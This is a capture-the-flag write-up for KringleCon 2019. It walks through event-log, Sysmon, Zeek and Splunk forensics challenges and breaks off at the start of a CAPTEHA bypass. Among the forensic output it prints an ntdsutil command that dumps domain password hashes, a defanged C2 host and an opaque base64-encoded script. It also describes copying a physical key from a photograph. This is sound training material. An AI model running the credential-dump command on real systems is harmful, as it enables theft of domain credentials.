@@ -1,0 +1,2175 @@
+= 2019 KringleCon ctf writeup
+Brandon Ingalls <brandon@tr4.dev>
+v0.1.0, 2019-12-28
+:toc:
+:imagesdir: ./images/main
+
+== Challenges
+
+=== __ - Start of Kringlecon
+
+Location: `Train Station`
+
+Difficulty: `0/5`
+
+image::../99/00-Hello.png[My character next to Santa]
+
+* After signing in for the first time you find yourself at the `Train Station`
+* Talk to `Santa`
+* Get story
++
+----
+(Santa)
+- Welcome to the North Pole and KringleCon 2!
+- Last year, KringleCon hosted over 17,500 attendees and my castle got a little crowded.
+- We moved the event to Elf University (Elf U for short), the North Pole’s largest venue.
+- Please feel free to explore, watch talks, and enjoy the con!
+----
+
+=== 00 - Talk to Santa in the Quad
+
+Location: `The Quad`
+
+Difficulty: `0/5`
+
+image::00/00-location.png[Me next to Santa]
+
+.Objective
+----
+Enter the campus quad and talk to Santa.
+----
+
+==== Solution
+
+. Click on `Santa` until they repeat
+
+==== Chat
+
+.Chat log
+----
+(Santa)
+- This is a little embarrassing, but I need your help.
+- Our KringleCon turtle dove mascots are missing!
+- They probably just wandered off.
+- Can you please help find them?
+- To help you search for them and get acquainted with KringleCon, I’ve created some objectives for you. You can see them in your badge.
+- Where's your badge? Oh! It's that big, circle emblem on your chest - give it a tap!
+- We made them in two flavors - one for our new guests, and one for those who've attended both KringleCons.
+- After you find the Turtle Doves and complete objectives 2-5, please come back and let me know.
+- Not sure where to start? Try hopping around campus and talking to some elves.
+- If you help my elves with some quicker problems, they'll probably remember clues for the objectives.
+----
+
+=== 01 - Find the Turtle Doves
+
+Location: `Student Union`
+
+Difficulty: `0/5`
+
+image::01/00-location.png[Me next to the doves]
+
+.Objective
+----
+Find the missing turtle doves.
+----
+
+==== Solution
+
+. Click on the doves until they repeat
+
+==== Chat
+
+.Chat log
+----
+(Michael and Jane - Two Turtle Doves)
+- Hoot Hooot?
+----
+
+=== 02 - Unredact Threatening Document
+
+Location: `The Quad`
+
+Difficulty: `1/5`
+
+image::02/00-location.png[Me next to the redacted document]
+
+.Objective
+----
+Someone sent a threatening letter to Elf University. What is the first word in ALL CAPS in the subject line of the letter? Please find the letter in the Quad.
+----
+
+==== Links
+
+. https://mega.nz/#!N9gBVaSZ!FtcN0Sf22Nf7ma0OSWI0OOzs6xoH0UAE5CAcelpNQuU[LetterToElfUPersonnel.pdf]
+** The redacted document
++
+NOTE: SHA256 `2f7b3ba81f1718d29ee73e82b19eb0f7a85e5b7835aaac0155edd233619b3c5e`
+
+==== Solution
+
+. Open the PDF
++
+image::02/01-document.png[Picture of redacted document]
++
+. Select all text in the document
++
+NOTE: Using `[Ctrl]` + `a`
++
+image::02/02-selected.png[Picture of highlighted document]
++
+. Copy the text
++
+NOTE: Using `[Ctrl]` + `c`
++
+. Paste the copied content into a text editor
++
+NOTE: Using `[Ctrl]` + `v`
++
+.Documents unredacted contents
+----
+Date: February 28, 2019
+
+To the Administration, Faculty, and Staff of Elf University
+17 Christmas Tree Lane
+North Pole
+
+From: A Concerned and Aggrieved Character
+
+Subject: DEMAND: Spread Holiday Cheer to Other Holidays and Mythical Characters… OR
+ELSE!
+
+
+Attention All Elf University Personnel,
+
+It remains a constant source of frustration that Elf University and the entire operation at the
+North Pole focuses exclusively on Mr. S. Claus and his year-end holiday spree. We URGE
+you to consider lending your considerable resources and expertise in providing merriment,
+cheer, toys, candy, and much more to other holidays year-round, as well as to other mythical
+characters.
+
+For centuries, we have expressed our frustration at your lack of willingness to spread your
+cheer beyond the inaptly-called “Holiday Season.” There are many other perfectly fine
+holidays and mythical characters that need your direct support year-round.
+
+If you do not accede to our demands, we will be forced to take matters into our own hands.
+We do not make this threat lightly. You have less than six months to act demonstrably.
+
+Sincerely,
+
+--A Concerned and Aggrieved Character
+
+Confidential
+Confidential
+----
+
+NOTE: *Answer:* `DEMAND`
+
+=== 03 - Windows Log Analysis: Evaluate Attack Outcome
+
+Location: `Offline`
+
+Difficulty: `1/5`
+
+.Objective
+----
+We're seeing attacks against the Elf U domain! Using the event log data, identify the user account that the attacker compromised using a password spray attack. Bushy Evergreen is hanging out in the train station and may be able to help you out.
+----
+
+==== Links
+
+. https://mega.nz/#!choxHC7K!C1r5Yp4ikeA_OnYswhEKuwLEqWgYxoLCAUTh-oMiiso[Security.evtx.zip]
+** Archive containing a Windows event log export for `Security`
++
+NOTE: SHA256 `7583da028561af31a25a9cecab2c0bb77967a646e4808773b0cc23e62b70c0dd`
+
+==== Solution
+
+. Setup working directory for this challenge
++
+[source, bash, options="nowrap"]
+----
+# Create a temp directory
+[~]$ cd "$(mktemp -d /tmp/ctf-03.XXX)"
+
+# Extract the provided archive
+[/tmp/ctf-03.rhb]$ unzip /path/to/Security.evtx.zip
+Archive:  /path/to/Security.evtx.zip
+  inflating: Security.evtx
+
+# Create a python2 virtualenv
+[/tmp/ctf-03.rhb]$ python2 -m virtualenv .venv
+
+# Verify layout
+[/tmp/ctf-03.rhb]$ ls -A1
+Security.evtx
+.venv
+----
++
+. Activate the python virtualenv
++
+[source, bash, options="nowrap"]
+----
+[/tmp/ctf-03.rhb]$ source .venv/bin/activate
+(.venv) [/tmp/ctf-03.rhb]$
+----
++
+. Install python tools
++
+----
+# Install tools via pip
+(.venv) [/tmp/ctf-03.rhb]$ pip install \
+                                       'python-evtx>=0.6.1' \
+                                       'yq>=2.10.0'
+----
++
+. Convert `.evtx` to `.xml`
++
+[source, bash, options="nowrap"]
+----
+# Convert evtx => xml
+(.venv) [/tmp/ctf-03.rhb]$ time evtx_dump.py Security.evtx > Security.xml
+evtx_dump.py Security.evtx > Security.xml  39.01s user 0.07s system 99% cpu 39.084 total
+
+# Check sizes
+(.venv) [/tmp/ctf-03.rhb]$ ls -Alh Security.evtx Security.xml
+-rwxr-xr-x 1 t4r t4r 3.1M Nov 19 06:29 Security.evtx
+-rw-r--r-- 1 t4r t4r 6.9M Dec 28 14:40 Security.xml
+----
++
+. Convert `.xml` to `.json`
++
+[source, bash, options="nowrap"]
+----
+(.venv) [/tmp/ctf-03.rhb]$ time xq '.Events' Security.xml > Security.json
+xq '.Events' Security.xml > Security.json  10.74s user 2.95s system 121% cpu 11.282 total
+----
++
+. Disable virtualenv
++
+NOTE: We shouldn't need it anymore
++
+[source, bash, options="nowrap"]
+----
+(.venv) [/tmp/ctf-03.rhb]$ deactivate
+[/tmp/ctf-03.rhb]$
+----
++
+. Start pivoting with `jq`
+.. Figure out when the attack started - Event ID 4625
++
+[source, bash, options="nowrap"]
+----
+# Filter for failed logins
+[/tmp/ctf-03.rhb]$ cat Security.json \
+                     | jq '.Event[] | select(.System.EventID."#text"=="4625")' > Security-4625.json
+
+# Store jq filter
+[/tmp/ctf-03.rhb]$ read -r -d '' filter << 'EOF'
+[
+  {
+    "time": .System.TimeCreated."@SystemTime",
+    "user": .EventData.Data[] | select(."@Name"=="TargetUserName")."#text",
+    "ip": .EventData.Data[] | select(."@Name"=="IpAddress")."#text"
+  }
+]
+  | sort_by(.time)
+    | .[]
+EOF
+
+# Parse into readable format
+[/tmp/ctf-03.rhb]$ cat Security-4625.json \
+                     | jq -c "${filter}" > failed_logins.jsonl
+----
++
+... Review `failed_logins.jsonl`
++
+NOTE: Scan happened `2019-11-19 12:21` => `2019-11-19 12:22`
++
+.. Event ID 4624 (An account was successfully logged on)
++
+[source, bash, options="nowrap"]
+----
+# Filter for successful logins
+[/tmp/ctf-03.rhb]$ cat Security.json \
+                     | jq '.Event[] | select(.System.EventID."#text"=="4624")' > Security-4624.json
+----
++
+.Example 4624 event
+image::03/00-4624.png[Example 4624 event]
++
+.. Parse filtered `4624` events into a more readable format
++
+[source, bash, options="nowrap"]
+----
+[/tmp/ctf-03.rhb]$ read -r -d '' filter << 'EOF'
+[
+  {
+    "time": .System.TimeCreated."@SystemTime",
+    "user": .EventData.Data[] | select(."@Name"=="TargetUserName")."#text",
+    "ip": .EventData.Data[] | select(."@Name"=="IpAddress")."#text"
+  }
+]
+  | sort_by(.time)
+    | .[]
+EOF
+
+[/tmp/ctf-03.rhb]$ cat Security-4624.json \
+                     | jq -c "${filter}" \
+                       | tee logins.jsonl
+{"time":"2019-08-24 00:00:20.189180","user":"pminstix","ip":"192.168.86.128"}
+{"time":"2019-08-24 00:00:41.380116","user":"DC1$","ip":"fe80::75f6:7c88:9877:ce71"}
+{"time":"2019-11-19 12:21:34.496546","user":"pminstix","ip":"192.168.86.128"}
+{"time":"2019-11-19 12:21:41.375494","user":"DC1$","ip":"::1"}
+{"time":"2019-11-19 12:21:45.755442","user":"supatree","ip":"127.0.0.1"}
+{"time":"2019-11-19 12:21:46.715054","user":"DC1$","ip":"fe80::75f6:7c88:9877:ce71"}
+{"time":"2019-11-19 12:21:46.724463","user":"DC1$","ip":"fe80::75f6:7c88:9877:ce71"}
+{"time":"2019-11-19 12:22:25.172413","user":"DC1$","ip":"fe80::75f6:7c88:9877:ce71"}
+{"time":"2019-11-19 12:22:25.175280","user":"DC1$","ip":"fe80::75f6:7c88:9877:ce71"}
+{"time":"2019-11-19 12:22:25.180609","user":"DC1$","ip":"::1"}
+{"time":"2019-11-19 12:22:25.184385","user":"DC1$","ip":"192.168.86.190"}
+{"time":"2019-11-19 12:22:25.284060","user":"DC1$","ip":"fe80::75f6:7c88:9877:ce71"}
+{"time":"2019-11-19 12:22:41.383135","user":"DC1$","ip":"::1"}
+{"time":"2019-11-19 12:23:05.847099","user":"supatree","ip":"192.168.86.128"}
+{"time":"2019-11-19 12:23:41.405107","user":"DC1$","ip":"::1"}
+{"time":"2019-11-19 12:23:47.222954","user":"DC1$","ip":"fe80::75f6:7c88:9877:ce71"}
+----
++
+.. Filter out `Kerberos` events
++
+[source, bash, options="nowrap"]
+----
+[/tmp/ctf-03.rhb]$ cat logins.jsonl | grep -vE 'DC1\$'
+{"time":"2019-08-24 00:00:20.189180","user":"pminstix","ip":"192.168.86.128"}
+{"time":"2019-11-19 12:21:34.496546","user":"pminstix","ip":"192.168.86.128"}
+{"time":"2019-11-19 12:21:45.755442","user":"supatree","ip":"127.0.0.1"}
+{"time":"2019-11-19 12:23:05.847099","user":"supatree","ip":"192.168.86.128"}
+----
+... Note the odd one out
++
+----
+{"time":"2019-11-19 12:21:45.755442","user":"supatree","ip":"127.0.0.1"}
+----
+
+NOTE: *Answer:* `supatree`
+
+=== 04 - Windows Log Analysis: Determine Attacker Technique
+
+Location: `Offline`
+
+Difficulty: `2/5`
+
+.Objective
+----
+Using these normalized Sysmon logs, identify the tool the attacker used to retrieve domain password hashes from the lsass.exe process. For hints on achieving this objective, please visit Hermey Hall and talk with SugarPlum Mary.
+----
+
+==== Links
+
+* https://mega.nz/#!VwojHSaS!u7mcytO5T4rfpxLhMowJ3-fY4ROsDB4Tst-J6XbYoys[sysmon-data.json.zip]
+** Archive containing Sysmon data formatted as json
++
+NOTE: SHA256 `b54e4d573c100eb51328673f057e51b6292e2e071b421e94edf7d1fd02447d06`
+
+==== Solution
+
+. Create working directory
++
+[source, bash, options="nowrap"]
+----
+# Create a temp directory
+[~]$ cd "$(mktemp -d /tmp/ctf-04.XXX)"
+
+# Unzip provided archive
+[/tmp/ctf-04.9SY]$ unzip /path/to/sysmon-data.json.zip
+Archive:  /path/to/sysmon-data.json.zip
+  inflating: sysmon-data.json
+
+# Verify size
+[/tmp/ctf-04.9SY]$ ls -Alh sysmon-data.json
+-rwx------ 1 t4r t4r 1.8M Dec  5 14:41 sysmon-data.json
+----
++
+. Figure out what type sysmon events we have
++
+[source, bash, options="nowrap"]
+----
+[/tmp/ctf-04.9SY]$ cat sysmon-data.json | jq '[.[].event_type] | unique'
+[
+  "file",
+  "network",
+  "process",
+  "registry"
+]
+----
++
+NOTE: As the challenge is asking for what tool was run on the host I decided to start with `process` events (event_id: `1`)
++
+. Filter out `event_type=process`
++
+[source, bash, options="nowrap"]
+----
+# Filter process events into `sysmon-data-process.jsonl`
+[/tmp/ctf-04.9SY]$ cat sysmon-data.json \
+                     | jq -c '.[] | select(.event_type=="process")' > sysmon-data-process.jsonl
+
+# Create an abbriged version of the process file
+# - This is easier to skim through
+[/tmp/ctf-04.9SY]$ cat sysmon-data-process.jsonl \
+                     | jq -c '[{"timestamp", "user_name", "process_name", "command_line"}] | sort_by(.timestamp) | .[]' > process_short.jsonl
+
+# Filter out boring commands with grep as you go
+[/tmp/ctf-04.9SY]$ cat process_short.jsonl \
+                     | grep -vE '(powershell|net|wevtutil|cmd)\.exe'
+{"timestamp":132186398470300000,"user_name":"SYSTEM","process_name":"ntdsutil.exe","command_line":"ntdsutil.exe  \"ac i ntds\" ifm \"create full c:\\hive\" q q"}
+----
+
+NOTE: *Answer:* `ntdsutil`
+
+[quote, 'https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753343(v%3Dws.11)[Microsoft]']
+Ntdsutil.exe is a command-line tool that provides management facilities for Active Directory Domain Services (AD DS) and Active Directory Lightweight Directory Services (AD LDS). You can use the ntdsutil commands to perform database maintenance of AD DS, manage and control single master operations, and remove metadata left behind by domain controllers that were removed from the network without being properly uninstalled. This tool is intended for use by experienced administrators.
+
+=== 05 - Network Log Analysis: Determine Compromised System
+
+Location: `Offline`
+
+Difficulty: `2/5`
+
+.Objective
+----
+The attacks don't stop! Can you help identify the IP address of the malware-infected system using these Zeek logs? For hints on achieving this objective, please visit the Laboratory and talk with Sparkle Redberry.
+----
+
+==== Links
+
+* https://mega.nz/#!x0gVCSob!e6YHqJcdXYKVzdJDZOte2hpGZGN5uapE2UpBmFSGUQk[elfu-zeeklogs.zip]
+** Archive of Zeek logs
++
+NOTE: SHA256: `8b2d0d64c310d63efe9fc57e6945f9f8d4498501b39039cd161ee5a9485258af`
+
+==== Solution
+
+. Create working directory
++
+[source, bash, options="nowrap"]
+----
+# Create a temp directory
+[~]$ cd "$(mktemp -d /tmp/ctf-05.XXX)"
+
+# Unzip provided archive
+[/tmp/ctf-05.bl9]$ unzip /path/to/elfu-zeeklogs.zip
+Archive:  /path/to/elfu-zeeklogs.zip
+...
+  inflating: elfu-zeeklogs/conn.log-00057_20190824000518.log
+----
++
+. Create tool to parse the `Zeek` logs into `jsonl`
++
+NOTE: I made a quick python script to do this
++
+NOTE: This will make it easier to use `jq` to filter the data
++
+.Custom script
+[source, bash, options="nowrap"]
+----
+# Extract log converter
+[/tmp/ctf-05.bl9]$ base64 -d << 'EOF' | gzip --decompress > convert-log.py
+H4sICHP2B14CA2NvbnZlcnQtbG9nLnB5AH1VPVPjMBDt/SuEUsSeAQNXZibFFRTXcBRU58t4RLxJ
+dNiSR5JDgOG/366k+CMBXGRs6e3b75fZBbvurLl+kuoa1J61r26n1Y8kkU2rjWPCbFthLBy//1mt
+ju/aJklSwYZ5RIlQm2aLhOHjTwxb9vb5T7PtGlDuwd+k2QiWi6oia3+f8lpv+SXbQd0u+YNwO+Y0
++wPwzOgi2JGr0ogXdBApxiF4iAHXGcX2eJ4e4dkkXqQrN7KGFF9i2A04gZzvH/7LAgKF05THvVbg
+DzcS6sqOTyrhROleWzge+tNaKoghIn9uQFR0FKOjV7qJoNw6I9t4N2P3vx/vFuxxB+jNWBfQdqe7
+umI7sQfm8Gov6g5YZ6FiwjIxRBtJwrPB6AltAHn0xr9jPB4jN4zPejPOlHZMKu8tlMPXUUgL7O6w
+htZJrdL+gh4+fyf0x5y9YAxkT/xD3UKMvxgcWlg7qC54jgE1wqVktqSfrCfMpkUvbVtLF4uU+4+U
+M36KArsWLdZgeWpZXN2uztp4ZpdXsNYVpLxTkl6uwnl0Q/NQ8KFEq88oQr+p0H3PqYp6OxTxq3b3
+gBnze+HLR05ppph40p2bdCx2jXiKGwxmiQ3ki0lLPqvaX8dHvoI/A42OkzSfzVlrYCMPEwzFUT7D
+a5ziUNSb1acYvB/Di9vFKjkDFkfIqqcj3Bi21spJ1UEyTpfmKqzdNNV+FYk33wJmGo5QPopVdkrR
+7+mUZby+A1GLwhNoKOXkm+r28zA49N1DGTmg7YIdituVH48DzcUbNj5EeRnYso+JXcHfUOt8QH7c
++vCGIFojUSdJifOqa1qbEiYby17UuUZI5cUvyhspHiUWdNmGTAdVjXXSNidQLu1RHb1R9rUmoAwQ
+AmWg0hB0AA7SumHd6XrZM8VhfJEYim5B9T4uGTdPPCNBm+zPuWAT2UnGGH5ZKtFAWfrNKEvKvyzj
+glDGx/+L8R9FX6Slr1TyH0d4njISBwAA
+EOF
+----
++
+. Start pivoting with Zeek conn events
++
+[source, bash, options="nowrap"]
+----
+# Create `zeek.jsonl`
+[/tmp/ctf-05.bl9]$ find ./elfu-zeeklogs/ \
+                          -iname 'conn*.log' \
+                          -type f \
+                          -exec python ./convert-log.py {} ';' > zeek-conn.jsonl
+
+# Check sizes
+[/tmp/ctf-05.bl9]$ ls -lh zeek-conn.jsonl
+-rw-r--r-- 1 t4r t4r 770M Dec 28 18:57 zeek-conn.jsonl
+
+# Look for long-lived connections
+[/tmp/ctf-05.bl9]$ cat zeek-conn.jsonl \
+                     | jq -s -c '[.[] | select(.duration!="-")] | . | sort_by(.duration|tonumber) | reverse | .[]' \
+                       | head \
+                         | tee top-conn.txt
+
+# Make it eaiser to read
+[/tmp/ctf-05.bl9]$ cat top-conn.txt \
+                     | jq -c '{"proto", "id.orig_h", "id.resp_h", "id.resp_p", "uid"}'
+{"proto":"udp","id.orig_h":"10.142.148.1","id.resp_h":"255.255.255.255","id.resp_p":"17500","uid":"CFp61A2tCWNnVBMvZ8"}
+{"proto":"udp","id.orig_h":"10.142.148.1","id.resp_h":"10.142.151.255","id.resp_p":"17500","uid":"CPEjh03sHL2fw2KVr9"}
+{"proto":"tcp","id.orig_h":"192.168.134.130","id.resp_h":"148.69.64[.]76","id.resp_p":"443","uid":"C9mIoHHpnSvcvBUme"}
+{"proto":"tcp","id.orig_h":"192.168.134.130","id.resp_h":"148.69.64[.]76","id.resp_p":"443","uid":"Cpsfbu2RiDZx0c8kn7"}
+{"proto":"udp","id.orig_h":"10.142.148.1","id.resp_h":"255.255.255.255","id.resp_p":"17500","uid":"CHgaNmEHxh4EU0oQj"}
+{"proto":"udp","id.orig_h":"10.142.148.1","id.resp_h":"10.142.151.255","id.resp_p":"17500","uid":"C0SkC82J7wY3N1WG5l"}
+{"proto":"udp","id.orig_h":"10.142.148.1","id.resp_h":"255.255.255.255","id.resp_p":"17500","uid":"Cz6Yt11qPAC75MXHt4"}
+{"proto":"udp","id.orig_h":"10.142.148.1","id.resp_h":"10.142.151.255","id.resp_p":"17500","uid":"CbtldJSgT161hzY53"}
+{"proto":"tcp","id.orig_h":"192.168.134.130","id.resp_h":"148.69.64[.]76","id.resp_p":"443","uid":"C0ZpeF4800AaS7daZe"}
+{"proto":"udp","id.orig_h":"10.142.148.1","id.resp_h":"255.255.255.255","id.resp_p":"17500","uid":"CW9Hxc1ETzjzpoCT8c"}
+----
++
+NOTE: `192.168.134.130` => `148.69.64[.]76:443/tcp` seems pretty *sketch*.
+
+NOTE: *Answer:* `192.168.134.130`
+
+==== Chat
+
+.Chat log
+----
+(Santa)
+- Thank you for finding Jane and Michael, our two turtle doves!
+- I’ve got an uneasy feeling about how they disappeared.
+- Turtle doves wouldn’t wander off like that.
+- Someone must have stolen them! Please help us find the thief!
+- It’s a moral imperative!
+- I think you should look for an entrance to the steam tunnels and solve Challenge 6 and 7 too!
+- Gosh, I can’t help but think:
+- Winds in the East, snow coming in…
+- Like something is brewing and about to begin!
+- Can’t put my finger on what lies in store,
+- But I fear what’s to happen all happened before!
+----
+
+=== 06 - Splunk
+
+Location: `https://splunk.elfu.org/`
+
+Difficulty: `3/5`
+
+image::06/00-location.png[Challenge screen]
+
+.Objective
+----
+Access https://splunk.elfu.org/ as elf with password elfsocks. What was the message for Kent that the adversary embedded in this attack? The SOC folks at that link will help you along! For hints on achieving this objective, please visit the Laboratory in Hermey Hall and talk with Prof. Banas.
+----
+
+==== Solution
+
+===== Part A
+
+We need to complete the Training questions to get important bits of information before we can complete the challenge question.
+
+. What is the short host name of Professor Banas' computer?
+** We can find this inside of the `SOC chat`
++
+image::06/01-hostname.png[Picture showing hostname of sweetums]
++
+NOTE: *Answer:* `sweetums`
++
+. What is the name of the sensitive file that was likely accessed and copied by the attacker? Please provide the fully qualified location of the file. (Example: C:\temp\report.pdf)
+** After solving question one, the chat app updates with more information
++
+image::06/02-hint.png[Hint that gives you a starting search]
++
+** The link takes you to the following Splunk search
++
+----
+index=main cbanas
+----
++
+** As the question was asking for information on information accessed by the attacker I used a basic search...
++
+----
+    index=main
+AND cbanas
+AND Users
+----
++
+image::06/03-answer.png[Answer for q02]
++
+NOTE: *Answer:* `C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt`
++
+. What is the fully-qualified domain name(FQDN) of the command and control(C2) server? (Example: badguy.baddies[.]com)
+** It looked like Empire was being used on the Windows host
+** I did a search for Sysmon Event ID *3* made by `powershell.exe`
++
+----
+    index=main
+AND EventID=3
+AND Computer="sweetums*"
+AND process_name="powershell.exe"
+----
++
+image::06/04-search.png[Search results]
++
+NOTE: *Answer:* `144.202.46[.]214.vultr[.]com`
++
+. What document is involved with launching the malicious PowerShell code? Please provide just the filename. (Example: results.txt)
+** Did a basic search for Sysmon event id `1`
++
+----
+    index=main
+AND EventID=1
+AND Computer="sweetums*"
+----
++
+image::06/05-table.png[Search results]
++
+** I see see Powershell running an Empire payload at `05:18 PM`
+** https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Decode_text('UTF-16LE%20(1200)')Generic_Code_Beautify()[CyberChef Recipe]
++
+image::06/06-payload.png[Empire payload decoded]
++
+NOTE: The parent process of the malicious `powershell.exe` is `WmiPrvSE.exe`, so it was started via a script, going to guess it was from an office product macro.
++
+** Struck out with this search
++
+----
+    index=main
+AND EventCode=1
+AND NOT docx
+----
++
+image::06/07-no-results.png[No bad results]
++
+** Noticed this message in chat
++
+image::06/08-chat.png[Chat message]
++
+** Tried new search (Limited to around the time Empire payload was executed)
++
+----
+    index=main
+AND EventCode=4688
+AND NOT docx
+
+| sort _time
+----
++
+image::06/09-found-bad.png[Table with bad doc]
++
+NOTE: *Answer:* `19th Century Holiday Cheer Assignment.docm`
++
+. How many unique email addresses were used to send Holiday Cheer essays to Professor Banas? Please provide the numeric value. (Example: 1)
+** Read the chat
++
+image::06/10-chat.png[Chat message]
++
+** Need to look for emails with the subject of *Holiday Cheer Assignment Submission*
++
+.Query
+----
+    index=main
+AND sourcetype=stoq
+AND results{}.workers.smtp.subject="Holiday Cheer Assignment Submission"
+
+| eval email_from = mvindex(lower('results{}.workers.smtp.from'), 0)
+  | stats dc(email_from)
+----
++
+NOTE: *Answer:* `21`
++
+. What was the password for the zip archive that contained the suspicious file?
+** Starting with this search
++
+----
+    index=main
+AND sourcetype=stoq
+AND results{}.workers.smtp.subject="Holiday Cheer Assignment Submission"
+AND docm
+----
++
+image::06/11-results.png[Search results]
++
+NOTE: *Answer:* `123456789`
++
+. What email address did the suspicious file come from?
+** Using my table from the previous question I was able to pull the email address for this question
++
+NOTE: *Answer:* `bradly.buttercups@eifu[.]org`
+
+==== Part B
+
+NOTE: This is the official challenge solution, we needed the information from the training questions to get the data for this question.
+
+. Find artifact meta information
++
+image::06/12-artifacts.png[Email artifacts]
++
+. Convert artifact links to download urls
++
+NOTE: We are provided with a http://elfu-soc.s3-website-us-east-1.amazonaws.com/[link] to the SOCs case artifacts
++
+[source, bash, options="nowrap"]
+----
+# Create work dir
+[~]$ cd "$(mktemp -d /tmp/ctf-06.XXX)"
+
+# Convert to bucket urls
+[/tmp/ctf-06.I4z]$ sed -re 's,^,http://elfu-soc.s3-website-us-east-1.amazonaws.com/stoQ%20Artifacts,' << 'EOF' | tee urls.txt
+/home/ubuntu/archive/7/f/6/3/a/7f63ace9873ce7326199e464adfdaad76a4c4e16
+/home/ubuntu/archive/9/b/b/3/d/9bb3d1b233ee039315fd36527e0b565e7d4b778f
+/home/ubuntu/archive/c/6/e/1/7/c6e175f5b8048c771b3a3fac5f3295d2032524af
+/home/ubuntu/archive/b/e/7/b/9/be7b9b92a7acd38d39e86f56e89ef189f9d8ac2d
+/home/ubuntu/archive/1/e/a/4/4/1ea44e753bd217e0edae781e8b5b5c39577c582f
+/home/ubuntu/archive/e/e/b/4/0/eeb40799bae524d10d8df2d65e5174980c7a9a91
+/home/ubuntu/archive/1/8/f/3/3/18f3376a0ce18b348c6d0a4ba9ec35cde2cab300
+/home/ubuntu/archive/f/2/a/8/0/f2a801de2e254e15840460f4a53e568f6622c48b
+/home/ubuntu/archive/1/0/7/4/0/1074061aa9d9649d294494bb0ae40217b9c7a2d9
+/home/ubuntu/archive/8/6/c/4/d/86c4d8a2f37c6b4709273561700640a6566491b1
+/home/ubuntu/archive/a/2/b/b/1/a2bb14afe8161ee9bd4a6ea10ef5a9281e42cd09
+/home/ubuntu/archive/4/0/d/c/1/40dc1e00e2663cb33f8c296cdb0cd52fa07a87b6
+/home/ubuntu/archive/f/5/c/b/a/f5cba8a650d6ada98d170f1b22098d93b8ff8879
+/home/ubuntu/archive/0/2/b/6/7/02b67cad55d2684115a7de04d0458a3af46b12c6
+/home/ubuntu/archive/1/7/6/1/2/1761214092f5c0e375ab3bc58a8687134b7f2582
+/home/ubuntu/archive/b/7/7/0/f/b770f3a79423882bdae4240e995c0885770022ef
+/home/ubuntu/archive/9/d/7/a/b/9d7abf0ee4effcecad80c8bbfb276079a05b4342
+/home/ubuntu/archive/e/9/2/1/1/e9211c706be234c20d3c02123d85fea50ae638fd
+/home/ubuntu/archive/f/f/1/e/a/ff1ea6f13be3faabd0da728f514deb7fe3577cc4
+/home/ubuntu/archive/7/f/6/3/a/7f63ace9873ce7326199e464adfdaad76a4c4e16
+/home/ubuntu/archive/9/b/b/3/d/9bb3d1b233ee039315fd36527e0b565e7d4b778f
+/home/ubuntu/archive/c/6/e/1/7/c6e175f5b8048c771b3a3fac5f3295d2032524af
+EOF
+----
++
+. Download artifacts
++
+[source, bash, options="nowrap"]
+----
+# Create artifact directory
+[/tmp/ctf-06.I4z]$ mkdir artifacts && cd artifacts
+
+# Downlaod the artifacts
+[/tmp/ctf-06.I4z/artifacts]$ for url in $(cat ../urls.txt); do curl -OL "${url}"; done
+----
++
+. Look for messages to Kent
++
+NOTE: I've only showed the relevant content
++
+[source, bash, options="nowrap"]
+----
+[/tmp/ctf-06.I4z/artifacts]$ grep -ir 'kent'
+ff1ea6f13be3faabd0da728f514deb7fe3577cc4:...<dc:description>Kent you are so unfair. And we were going to make you the king of the Winter Carnival.</dc:description>...
+----
+
+image::06/13-end.png[Congrats screen]
+
+*Answer*: `Kent you are so unfair. And we were going to make you the king of the Winter Carnival.`
+
+=== 07 - Get Access To The Steam Tunnels
+
+Location: `Dorm`
+
+Difficulty: `3/5`
+
+image::07/00-location.png[Room in the dorm]
+
+.Objective
+----
+Gain access to the steam tunnels. Who took the turtle doves? Please tell us their first and last name. For hints on achieving this objective, please visit Minty's dorm room and talk with Minty Candy Cane.
+----
+
+==== Solution
+
+[quote, Minty Candycane]
+Maybe you'll see someone hopping around with a key here on campus.
+
+The goal of this challenge is to decode a key's bitting via an image of the key.
+
+When you first enter the room there is a NPC character that leaves into another room after a few moments.
+
+NOTE: This character has the key you are looking for on their belt.
+
+. Open the browser's network tools tab
++
+image::07/01-tools.png[Network tool]
++
+. Enter the room
+. Locate the NPC's asset load network event
++
+image::07/02-get.png[Krampus asset network event]
++
+. Save the asset
++
+----
+https://2019.kringlecon.com/images/avatars/elves/krampus.png
+----
++
+image::07/03-krampus.png[Krampus asset, height=100, width=100]
++
+. Cleaned the picture up with GIMP
++
+image::07/04-key.png[Plain key]
++
+. Decoded the key by looking at the heights relative to each other
++
+NOTE: *Key Bitting*: `122520`
++
+image::07/07-make-key.png[Crerating a key]
++
+image::07/05-122520.png[My key]
+
+image::07/06-win.png[Win screen]
+
+*Answer:* `Krampus Hollyfeld`
+
+==== Chat
+
+.Chat log
+----
+(Minty Candycane; Had to complete Holiday Hack Trail)
+- You made it - congrats!
+- Have you played with the key grinder in my room? Check it out!
+- It turns out: if you have a good image of a key, you can physically copy it.
+- Maybe you'll see someone hopping around with a key here on campus.
+- Sometimes you can find it in the Network tab of the browser console.
+- Deviant has a great talk on it at this year's Con.
+- He even has a collection of key bitting templates for common vendors like Kwikset, Schlage, and Yale.
+----
+
+=== 08 - Bypassing the Frido Sleigh CAPTEHA
+
+Location: `TBD`
+
+Difficulty: `4/5`
+
+image::08/00-location.png[Me next to Krampus]
+
+.Objective
+----
+Help Krampus beat the Frido Sleigh contest. For hints on achieving this objective, please talk with Alabaster Snowball in the Speaker Unpreparedness Room.
+----
+
+WARNING: On my initial run through of the CTF I completed this challenge before 07, so I did not have access to the files listed below, I ended up manually building my training data and model without the nice `capteha_api.py` file or the training data.
+
+==== Links
+
+* https://fridosleigh.com/[Frido Sleigh]
++
+image::08/01-site.png[Screenshot of the website]
++
+* https://mega.nz/#!Q0pnAYaB!ht9-69waSJUjorEiMybCebgCmajMsknA4NmHdx3wH20[capteha_api.py]
+** Skeleton solution script that I missed :)
++
+NOTE: SHA256: `322d960882a69d0966f1a4e10cb14d35e6f0f7edfc90ac37bdbeb564bdc00fae`
++
+* https://mega.nz/#!o55xUQ7I!dCIIiFp81T7B8RrKDHNCZUB9tS2zQElZpW-FSkQq3lo[capteha_images.tar.gz]
+** Data to train your model with; which I also missed...
++
+NOTE: SHA256: `c8b2be64449d4418dddb662c1c97f38343912952d53df6f77c5d87661449ff55`
+
+==== Solution
+
+. Review the website
+. Review the CAPTEHA api call
++
+NOTE: If you deal with json data a lot, https://github.com/tomnomnom/gron[gron] can make your data so much more readable.
++
